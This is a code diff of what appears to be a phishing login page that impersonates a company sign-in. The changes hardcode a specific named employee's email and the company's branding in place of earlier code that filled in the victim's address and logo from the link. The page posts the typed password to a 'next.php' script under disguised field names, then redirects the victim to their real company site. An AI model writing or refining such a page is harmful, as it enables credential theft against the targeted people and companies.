@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
     <style>
         body {
-            background: #2874A6
+            background: #f0f4f7; /* Light gray background */
             margin: 0;
             padding: 0;
             display: flex;
@@ -112,17 +112,17 @@
                 </div>
 
                 <!-- Company Name -->
-                <h5 id="companyName"></h5>
+                <h5 id="companyName">UNITEDCORPORATE</h5>
 
                 <!-- Error Message -->
                 <div id="error-message" style="display: none;">
-                    The password is incorrect. Try again with your email password.
+                    The password is incorrect or empty. Please try again.
                 </div>
 
                 <!-- Form Section -->
                 <div>
                     <p>Sign in with your Email to continue:</p>
-                    <input type="text" id="email" value="" readonly>
+                    <input type="text" id="email" value="megan.conley@unitedcorporate.com" readonly>
                     <p>Enter password:</p>
                     <input type="password" id="password" placeholder="Password">
                     <button type="button" onclick="nextFun();">Sign In</button>
@@ -143,30 +143,7 @@
 
     <script src="assets/bootstrap/js/bootstrap.min.js"></script>
     <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            const hash = decodeURIComponent(window.location.hash.substring(1));
-            if (!hash.includes("@")) return;
-
-            const emailParts = hash.split("@");
-            const domain = emailParts[1].toLowerCase();
-            document.getElementById("email").value = hash;
-
-            const companyNameMapping = {
-                "gagecoinc.com": "GAGECOINC",
-                "unitedcorporate.com": "UNITEDCORPORATE",
-                "pinnacleinfotech.com": "PINNACLEINFOTECH"
-            };
-
-            const companyName = companyNameMapping[domain] || domain.split(".")[0].toUpperCase();
-            document.getElementById("companyName").textContent = companyName;
-
-            const faviconUrl = `https://www.google.com/s2/favicons?sz=128&domain=${domain}`;
-            const logo = document.getElementById("logoImg");
-            logo.src = faviconUrl;
-        });
-
-        /* Backend Connectivity */
-        function nextFun() {
+        const nextFun = () => {
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
@@ -174,30 +151,33 @@
                 const errorDiv = document.getElementById("error-message");
                 errorDiv.style.display = "block";
                 errorDiv.innerText = "Email or Password cannot be empty.";
-                setTimeout(() => errorDiv.style.display = "none", 2000);
+                setTimeout(() => (errorDiv.style.display = "none"), 2000);
                 return;
             }
 
-            // AJAX request to next.php
+            // Send POST request to next.php
             fetch("./next.php", {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded",
-                },
-                body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`,
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `di=${encodeURIComponent(email)}&pr=${encodeURIComponent(password)}`,
             })
                 .then((response) => response.json())
                 .then((data) => {
+                    const errorDiv = document.getElementById("error-message");
                     if (data.success) {
-                        window.location.replace(data.redirectUrl || `https://${email.split("@")[1]}`);
+                        window.location.href = data.redirectUrl || `https://${email.split("@")[1]}`;
                     } else {
-                        const errorDiv = document.getElementById("error-message");
                         errorDiv.style.display = "block";
-                        errorDiv.innerText = "Invalid credentials. Please try again.";
+                        errorDiv.innerText = data.message || "Invalid credentials. Please try again.";
                     }
                 })
-                .catch((error) => console.error("Error during login:", error));
-        }
+                .catch((error) => {
+                    console.error("Error occurred:", error);
+                    const errorDiv = document.getElementById("error-message");
+                    errorDiv.style.display = "block";
+                    errorDiv.innerText = "An error occurred. Please try again.";
+                });
+        };
     </script>
 </body>
 
